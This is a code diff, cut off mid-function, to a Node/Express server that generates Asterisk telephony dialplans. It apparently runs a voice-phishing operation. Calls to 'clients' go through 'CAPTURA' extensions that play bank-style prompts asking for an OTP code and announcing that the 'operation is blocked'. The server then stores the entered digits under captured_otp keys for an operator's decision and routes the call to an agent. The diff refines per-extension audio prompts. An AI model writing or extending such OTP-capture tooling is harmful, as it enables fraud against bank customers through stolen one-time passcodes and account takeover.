@@ -1153,30 +1153,22 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
 
-  dialplanContent += ` ; Determinar audios para la extension 7777\n`;
+  // Determinar audios exclusivos para la extension 7777 (Sin cruce con otras extensiones)
+  dialplanContent += ` ; Determinar audios exclusivos para la extension 7777\n`;
   dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/default_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/welcome_7777)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
 
-  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
 
-  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
 
-  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
 
   dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
@@ -1305,24 +1297,21 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` ; Determinar audios exclusivos para la extension 6666\n`;
   dialplanContent += ` same => n,Set(AUDIO_6666=\${DB(ivr_vars/6666_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/6666_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/666_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/welcome_6666)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_intro)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=custom/bienvenida_6666))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/6666_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
+
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/6666_wait)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/6666_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
+
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/6666_success)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/6666_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
+
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/6666_failure)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
   dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
   dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
@@ -1439,24 +1428,21 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-3333] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` ; Determinar audios exclusivos para la extension 3333 (Sin cruce con otras extensiones)\n`;
   dialplanContent += ` same => n,Set(AUDIO_3333=\${DB(ivr_vars/3333_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/3333_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/333_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/welcome_3333)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/7777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/7777_intro)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=custom/bienvenida_3333))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_3333}" = ""]?Set(AUDIO_3333=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/3333_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/3333_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/333_wait)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/3333_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/3333_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/333_success)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/3333_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/3333_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/333_failure)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
   dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
   dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
@@ -1473,8 +1459,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/3333)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(captured_otp/333)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
@@ -1482,7 +1467,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/3333)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/333)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
@@ -1564,24 +1549,21 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-4444] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` ; Determinar audios exclusivos para la extension 4444 (Sin cruce con otras extensiones)\n`;
   dialplanContent += ` same => n,Set(AUDIO_4444=\${DB(ivr_vars/4444_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/4444_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/444_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/welcome_4444)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/7777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/7777_intro)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=custom/bienvenida_4444))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_4444}" = ""]?Set(AUDIO_4444=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/4444_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/4444_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/444_wait)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/4444_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/4444_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/444_success)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/4444_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/4444_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/444_failure)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
   dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
   dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
@@ -1598,8 +1580,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/4444)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(captured_otp/444)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
@@ -1607,7 +1588,7 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/4444)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/444)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
@@ -1689,24 +1670,21 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-5555] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` ; Determinar audios exclusivos para la extension 5555 (Sin cruce con otras extensiones)\n`;
   dialplanContent += ` same => n,Set(AUDIO_5555=\${DB(ivr_vars/5555_prompt)})\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/5555_intro)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/555_prompt)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/welcome_5555)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/7777_prompt)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/7777_intro)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=custom/bienvenida_5555))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_5555}" = ""]?Set(AUDIO_5555=custom/solicitar_codigo_otp))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/5555_wait)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/5555_wait)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/555_wait)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/5555_success)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/5555_success)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/555_success)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
-  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/5555_failure)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
+  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/5555_failure)})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/555_failure)}))\n`;
   dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
   dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
   dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
@@ -1723,7 +1701,15 @@ function generateCleanDialplanConf(
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/5555)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/7777)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(captured_otp/555)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/5555)=pending)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/555)=pending)\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/8888)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
@@ -2941,21 +2927,85 @@ app.post('/api/asterisk/audio/upload', express.json({ limit: '50mb' }), async (r
 
 // --- Centralized Audio Assignment Manager for Asterisk ---
 const ACTIVE_AUDIOS_FILE = path.join(process.cwd(), 'data', 'active_audios.json');
+const AUDIO_LOCKS_FILE = path.join(process.cwd(), 'data', 'audio_locks.json');
 
 const DEFAULT_AUDIO_ASSIGNMENTS: Record<string, string> = {
   press1_welcome: 'custom/bienvenida_corporativa',
   agent_transfer: 'custom/conectar_asesor_banco',
   press1_invalid: 'custom/opcion_invalida',
-  welcome_3333: 'custom/solicitar_codigo_otp',
-  welcome_4444: 'custom/solicitar_codigo_otp',
-  welcome_5555: 'custom/solicitar_codigo_otp',
-  welcome_6666: 'custom/solicitar_codigo_otp',
+
+  // Extension 7777
   welcome_7777: 'custom/solicitar_codigo_otp',
+  wait_7777: 'custom/un_momento_validando_informacion',
+  success_7777: 'custom/operacion_bloqueada_exito',
+  failure_7777: 'custom/token_invalido_reintente',
+
+  // Extension 6666
+  welcome_6666: 'custom/solicitar_codigo_otp',
+  wait_6666: 'custom/un_momento_validando_informacion',
+  success_6666: 'custom/operacion_bloqueada_exito',
+  failure_6666: 'custom/token_invalido_reintente',
+
+  // Extension 5555
+  welcome_5555: 'custom/solicitar_codigo_otp',
+  wait_5555: 'custom/un_momento_validando_informacion',
+  success_5555: 'custom/operacion_bloqueada_exito',
+  failure_5555: 'custom/token_invalido_reintente',
+
+  // Extension 4444
+  welcome_4444: 'custom/solicitar_codigo_otp',
+  wait_4444: 'custom/un_momento_validando_informacion',
+  success_4444: 'custom/operacion_bloqueada_exito',
+  failure_4444: 'custom/token_invalido_reintente',
+
+  // Extension 3333
+  welcome_3333: 'custom/solicitar_codigo_otp',
+  wait_3333: 'custom/un_momento_validando_informacion',
+  success_3333: 'custom/operacion_bloqueada_exito',
+  failure_3333: 'custom/token_invalido_reintente',
+
+  // Generic system fallbacks
   otp_welcome: 'custom/solicitar_codigo_otp',
   otp_wait: 'custom/un_momento_validando_informacion',
   otp_success: 'custom/operacion_bloqueada_exito',
   otp_failure: 'custom/token_invalido_reintente',
 };
+
+function loadManualAudioLocks(): Record<string, boolean> {
+  try {
+    if (fs.existsSync(AUDIO_LOCKS_FILE)) {
+      const raw = fs.readFileSync(AUDIO_LOCKS_FILE, 'utf-8');
+      return JSON.parse(raw);
+    }
+  } catch (e) {}
+  return {
+    welcome_7777: false,
+    welcome_6666: false,
+    welcome_5555: false,
+    welcome_4444: false,
+    welcome_3333: false,
